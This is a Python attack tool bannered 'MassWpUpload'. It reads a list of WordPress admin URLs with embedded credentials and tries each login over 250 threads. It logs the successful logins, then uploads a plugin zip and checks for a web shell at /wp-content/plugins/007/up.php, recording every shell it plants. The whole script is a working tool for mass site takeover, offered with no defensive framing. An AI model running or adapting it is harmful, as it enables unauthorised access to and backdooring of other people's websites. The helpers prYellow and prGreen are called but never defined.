#!/user/bin/python

#!/usr/bin/python
 # -*-coding:Latin-1 -*
import sys,urllib2
from colorama import *

from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore								
from colorama import Style								
from termcolor import colored
import requests, sys, re, os, time, random
from colorama import Fore, Back, Style
init()

la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'
r = Fore.RED
g = Fore.GREEN
w = Fore.WHITE
b = Fore.BLUE
y = Fore.YELLOW
m = Fore.MAGENTA


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
___  ___              _    _       _   _       _                 _ 
|  \/  |             | |  | |     | | | |     | |               | |
| .  . | __ _ ___ ___| |  | |_ __ | | | |_ __ | | ___   __ _  __| |
| |\/| |/ _` / __/ __| |/\| | '_ \| | | | '_ \| |/ _ \ / _` |/ _` |
| |  | | (_| \__ \__ \  /\  / |_) | |_| | |_) | | (_) | (_| | (_| |
\_|  |_/\__,_|___/___/\/  \/| .__/ \___/| .__/|_|\___/ \__,_|\__,_|
                            | |         | |                        
                            |_|         |_|                        
                                  Marwan007   
Link SHloud Be Like That                                                          
https://site.com/wp-login.php@user#&pass@
                                                                                                                         
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
print_logo()
def WploginShell(url):

	
	Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
	
	lib = requests.session()
	try:
	
	
		## Words Regex 
		First = re.findall('http://(.*?)/wp-login.php',url)
		site = 'http://'+First[0]
		GetRegex= lib.get(site+'/wp-login.php')

		# Regex Words of login 
		Regex = re.findall('"button button-primary button-large" value="(.*?)"',GetRegex.content)
		
		# User and Pass get it from File
		User = re.findall('@(.*?)#',url)
		Passwd = re.findall('&(.*?)@',url)
		
		# Post Data login
		Pax = {'log':User[0],
				   'pwd':Passwd[0], 
				   'wp-submit':Regex[0],
				   'redirect_to': site+'/wp-admin/', 
				   'testcookie':'1'}
	
		req = lib.post(site+'/wp-login.php', data=Pax, headers=Headers, timeout=20)
		if '<li id="wp-admin-bar-logout">' in req.content:
			save = open("logins.txt", 'a')
			save.write('[+]Login Success '+'\n'+"[#]Target:"+site+'\n'+'[#]UserName:'+User[0]+'\n'+'[#]Password:'+Passwd[0])
			save.close()
			prYellow( '[+]Login Success --> :'+site+'[#]UserName:'+User[0]+'[#]Password:'+Passwd[0])
			
			# Path for get Data 
			reqs = lib.get(site+'/wp-admin/plugin-install.php?tab=upload')
			
			Regex1 = re.findall('id="_wpnonce" name="_wpnonce" value="(.*?)"',reqs.content)
			
			Regex2 = re.findall('id="install-plugin-submit" class="button" value="(.*?)"',reqs.content)
	
			# Shell Uploads 
			FileUpload = 'up.zip'
			b0x = {'_wpnonce':Regex1[0],
			   '_wp_http_referer':site+'/wp-admin/plugin-install.php?tab=upload',
			   'install-plugin-submit':Regex2[0] }
			   
			b0x2 = {'pluginzip':(FileUpload, open(FileUpload, 'rb'), 'multipart/form-data')}
			
			login = lib.post(site+'/wp-admin/update.php?action=upload-plugin',data=b0x, files=b0x2, headers=Headers )
			
			uploads = lib.post(site+'/wp-admin/update.php?action=upload-plugin',files=b0x2, headers=Headers )

			exploit = requests.get(site+'/wp-content/plugins/007/up.php', timeout=20)
			if 'Filename:' in exploit.content:
				prGreen ( "[+] Uploaded Success --> "+site+"/wp-content/plugins/007/up.php" )
				open('Shells.txt', 'a').write(site+'/wp-content/plugins/007/up.php'+'\n')
			else:
				print ( "[-]Fail Uploaded -- > "+site )
		else:
			print( '[-] Login  Fail '+site )
			
	except:
		print ( "[-]Not Wordpress Panel -- > " )

		
def start():

	for i in Files.readlines():
		try:
			i = i.strip()
			data=WploginShell(i)
			
		except:
			pass
spy = raw_input('Enter List Name : ')			
Files = open(spy, 'r')
pool = ThreadPool(250)
pool.map(WploginShell, Files)
pool.close()
pool.join()
